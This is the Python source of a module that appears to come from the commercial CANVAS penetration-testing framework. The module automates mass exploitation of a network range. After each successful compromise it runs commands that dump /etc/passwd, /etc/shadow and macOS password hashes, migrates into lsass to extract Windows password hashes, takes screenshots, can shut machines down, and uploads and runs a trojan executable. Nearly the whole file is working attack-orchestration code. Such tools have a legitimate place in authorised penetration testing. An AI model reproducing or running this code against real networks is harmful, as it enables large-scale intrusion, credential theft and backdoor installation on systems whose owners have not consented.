#! /usr/bin/env python
"""
massattack2.py
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation


NAME="Mass Attack"
VERSION="2.0"
NOTES2="""

"""

CHANGELOG="""
1.0 
Created.
"""

DEBUGNOTES="""
    
"""

import os,getopt
import sys
if "." not in sys.path: sys.path.append(".")

import timeoutsocket
        
import socket
from exploitutils import *

from tcpexploit import tcpexploit
from msrpc import *
import canvasengine
import time

from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet

import libs.canvasos as canvasos

DOCUMENTATION={}
DOCUMENTATION["Notes"]="""
For a given network range do the following actions:
1. Find all the alive hosts
2. For each alive host run Autohack
3. If autohack reports success run a postscript on the node and exit cleanly
4. If we get a newnode and you've placed massattack_win32trojan.exe in the CANVAS root, it will be uploaded and run.
5. Write a little report about it using our reporting module

TODO:
Future releases want to fingerprint each host so that if a host changes IP, we still
know where it is.
"""

NAME="MassAttack2"
DESCRIPTION="Multi-threaded attack tool (With improved threading)"

VERSION="0.1"

#affectsList=["Recon"]
PROPERTY = {}
PROPERTY['TYPE'] = "Tools"

NOTES=""" 

"""

import libs.reporting as reporting
from hostKnowledge import *
from engine.config import canvas_resources_directory
import os
from engine.config import canvas_reports_directory
import traceback

from engine import CanvasConfig

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.vulns=[]
        self.setPort(0)
        self.setHost("")
        self.setVersion(1)
        self.istest=0
        self.setVersions()
        self.shellcode="A"
        self.localhost=""
        self.localport=0
        self.ssl=0
        self.doshell=1
        self.force=0
        self.name=NAME
        self.netmask="32"
        self.report=None
        self.portscan=1 #default is do a portscan
        self.followup=None #module to run on all successful targets (like startup)
        
        #self.onlymodule=None
        self.exploit_modules=None #If none autohack runs all the modules it can, else supply a list
        
        self.dead_thread_timeout=600 ##time to spin in wait_for_threads() until we decide we have a rouge thread and kill it
        self.autohack_module_table={}
        
        self.ignore_unid_hosts=1
        self.silica=False
        self.ssid=self.tpref=""
        self.localips=[]
        self.sshot=False
        #specific options from canvas.conf
        self.options={"trojan_win32Node": "bob.exe", "doscreengrab": False, "dogethashes": True, "Halt": False}
        return   

    
    def getargs(self):
        self.host=self.target.interface
        self.netmask=dInt(str(self.argsDict.get("netmask",self.netmask)).replace("/",""))
        self.portscan=int(self.argsDict.get("portscan",self.portscan))
        self.maxthreads=int(self.argsDict.get("maxthreads",self.maxthreads))
        self.exploit_modules=self.argsDict.get("exploit_modules",self.exploit_modules)
        self.ignore_unid_hosts=self.argsDict.get("ignore_unid_hosts",self.ignore_unid_hosts)
        self.ssid=self.argsDict.get("ssid",self.ssid)
        self.silica=self.argsDict.get("silica",self.silica)
        self.tpref=self.argsDict.get("tpref",self.tpref)
        self.sshot=self.argsDict.get("sshot",self.sshot)

        # overide CANVAS config in SILICA
        if self.silica:
            if self.sshot:
                self.options["doscreengrab"]=True
                self.options["dogethashes"]=False
            else:
                self.options["doscreengrab"]=False
                self.options["dogethashes"]=True
                
        # Normal CANVAS
        else:
            self.options["doscreengrab"]=CanvasConfig['massattack_doscreengrab']
            self.options["dogethashes"]=CanvasConfig['massattack_dogethashes']
            
        return
    

    def scan_lock(self):
        print "Creating lock file...",
        fp = open("SCAN_LOCK", "w")
        fp.close()
        print "done"
            
            
    def scan_unlock(self):
        print "Unlocking any active/stale files...",
        #if the file is not there, we ignore this
        try:
            os.unlink("SCAN_LOCK")
        except:
            pass 
        print "done"

    

    def process_thread_results(self, status_q, end_of_run_marker):
        """
        This is the ThreadRunner2 magic right here. Essentially ALL threads return state about
        what they are up to via a q to the ThreadTracker, The ThreadTracker then does some
        sanitization and spits stuff back down a results q to us.
        
        This means that we can sit in a loop and read from the same q for all the targets in
        our range and do stuff like reporting based on what we see coming back.
        
        Data comes back in the form of:
             [Thread Object to which this status relate] , [status marker] ,[data]
        
        *REMEBER* this is one queue for ALL threads, not one for each!
        """
        while 1:
            tr2_obj, status, data=status_q.get()
            
            if status == end_of_run_marker:
                ##ALL threads have completed so now more status/results to process
                tr2_obj.join()
                break
            
            elif status == "newhost":
                self.report.newhost(data) #data == target
                
            elif status == "note":
                self.report.note(data[0], data[1]) #data[0]==target, data[1]==explanation str
                
            elif status == "extras":
                self.report.add_extras(data) #data == str
                
            elif status == "failure":
                self.report.report_failure(data) #data == target
                
            elif status == "killed":
                self.report.report_failure(data[0]) #data == target
                self.report.note(data[0], data[1]) #data[0]==target, data[1]==explanation str
                
            elif status=="error":
                self.report.note(data[0], data[1]) #data[0]==target, data[1]==explanation str
                
            elif status == "exception":
                if self.silica:
                    outfile=file("SILICA.log","w")
                    #traceback.print_exc(file=outfile)
                    outfile.write(data)
                    outfile.close()
                else:
                    print data
                
            elif status == "success":
                ##And now we take actions based on the return of the sucessful exploit
                self.process_exploit_success(data) #data==results triplet from exploit module
        
        self.log("All results gathered")
        
    def process_exploit_success(self, result):
        """
        If an exploit succeeds we can do many different things, do the right ones
        based on what we get back!!
        """
        for target,usedvuln,newnode in result:
            self.log("We succeeded in penetrating %s"%self.target.interface)
            #newnode MAY be None in certain error cases
            #in that case, we simply continue
            self.report.report_success(target,usedvuln)
            if newnode!=None:
                type1=newnode.nodetype
                self.log("Nodetype on %s is %s"%(self.target.interface, type1))
                # This is unix type do something useful
                if type1=="UnixShellNode":
                    #TODO: here we are assuming OS X I think! We need to make this generica
                    cdata=newnode.runcommand("/usr/bin/nidump passwd . && cat /var/db/shadow/hash/*")
                    self.report.note(target, cdata)

                elif "Solaris" in newnode.capabilities:
                    self.log("Owned Solaris target")
                    cdata=newnode.runcommand("cat /etc/passwd && cat /etc/shadow && ls -lart /tmp/ && last")
                    self.report.note(target, cdata)

                elif "linux" in newnode.capabilities:
                    self.log("Owned Linux target")
                    cdata = newnode.runcommand("id && uname -a && cat /etc/passwd && cat /etc/shadow")
                    self.report.note(target, cdata)
                    
                # Win32 so we try hashes or screengrab
                elif "win32api" in newnode.capabilities:
                    if self.options["dogethashes"]:
                        self.log("Migrating into lsass")
                        ret=self.exploitnodes("mosdefmigrate",[newnode])
                        self.log("Grabbing password hashes")
                        ret=self.exploitnodes("getpasswordhashes",[newnode])[0]
                        if ret:
                            users=ret
                            for user in users:
                                self.report.note(target, "%s:%s:%s:%s:::"%(prettyprint(user[0]),prettyprint(user[1]),cleanhexprint(user[2]),cleanhexprint(user[3])))
                        else:
                            self.report.note(target,"Getting password hashes failed - LSA Service is damaged!")
                            

                    if self.options["doscreengrab"]:
                        self.log("Grabbing screenshot")
                        ret=self.exploitnodes("screengrab",[newnode])
                        if ret:
                            self.log("Reporting image on %s to %s"%(target.interface,ret))
                            self.report.setImage( target, ret )
                            
                    if self.options["Halt"]:        
                        self.exploitnodes("ExitWindows",[newnode])
                    
                    
                    if not self.silica:
                        self.log("looking for trojan for %s"%newnode.nodetype)
                        bdname=self.options.get("trojan_%s"%newnode.nodetype)
                        self.log("Trojan name: %s"%bdname)
                        bdfile=None
                        
                        if bdname:
                            try:
                                bdfile=file(bdname, "rb")
                            except:
                                self.log("No backdoor file found for uploading")
                        if bdfile:
                            #we have a trojan
                            self.log("Uploading and executing trojan")
                            #uploading is the same for all nodes
                            newnode.upload(bdname)
                            #unix nodes need a ./
                            if not "win32api" in newnode.capabilities:
                                bdname="./%s"%bdname
                            newnode.spawn(bdname)
                            

                    if self.followup:
                        self.exploitnodes(self.followup,[newnode])
                        self.log("Ran followup on %s"%self.target.interface)
                    else:
                        self.log("Followup on %s not requested"%self.target.interface)
            else:
                self.log("Did not get a node for host %s"%self.target.interface)
    
    def run(self):
        sil_flag=False 
        if self.argsDict.get("silica"):
            sil_flag=True
            self.scan_lock()
        self.getargs()
        
        self.localips=[]
        for node in self.argsDict.get("passednodes",[]):
            self.localips+=node.getallips()
            
        self.setInfo("Attacking: %s"%(self.host))
        self.log("Interface=%s"%self.host)
        self.log("Netmask=%s"%self.netmask)
        self.log("MaxThreads=%d"%self.maxthreads)
        self.report=reporting.report(self.tpref, sil_flag)
        self.vulns=[] #clear it
        #print ips

        if not canvasengine.registeredallmodules:
            canvasengine.registerAllModules()
        #time our scan run
        now=time.localtime(time.time())
        # %y is broken it reports something like '22'
        strtime=time.strftime("%Y/%m/%d %H:%M", now)
        self.log("Start time: %s"%strtime)
        tc0=time.time()
        self.node=self.argsDict["passednodes"][0]
            
        self.setInfo("[MassAttack2] Scanning network: %s/%s"%(self.host, self.netmask))
        self.setProgress(5)

        if not "threads" in self.node.capabilities:
            self.log("Warning: not using threads because selected node does not support threading, maxthreads reset to 1.")
            ##We are running on a MOSDEFNode so we can't do stuffs in parallel, set number of threads to 1
            self.maxthreads=1
        
        ##Do the scans
        self.run_threaded_on_alive_hosts(e_module="autohack")

        #end of our timing ...
        now=time.localtime(time.time())
        # same as above
        strtime=time.strftime("%Y/%m/%d %H:%M", now)
        self.log("Stop time: %s"%strtime)

        tc1=time.time()
        self.log("Seconds used: %s"%(tc1-tc0))

        if(self.silica):
            filename="%sMA_Report_%s_%s_%s.html"%(self.tpref, self.ssid,self.host,tc1)
        else:
            filename="Mass_Attack2_report_%s_%s.html"%(self.host,self.netmask)
        
        filename = filename.replace("/", "")        
        filename = os.path.join(canvas_reports_directory, filename)
        
        data=self.report.generate_massattack_html()
        file(filename,"wb").write(data)
        self.log("Wrote HTML formatted report to: %s"%filename)
        self.setInfo("Scanning %s (done)"%(self.host))
        if self.argsDict.get("silica"):
            self.scan_unlock()
            
        return 1
        
        
    def setVersions(self):
        self.versions={}
        self.versions[1]=("All", None)
        
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            
        
def usage():
    app = theexploit()
    print "Usage: "+sys.argv[0]+" [-T] [-v version]  -t target [ -p targetport:%d]"%(app.port)
    app.displayVersions()
    sys.exit()

#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

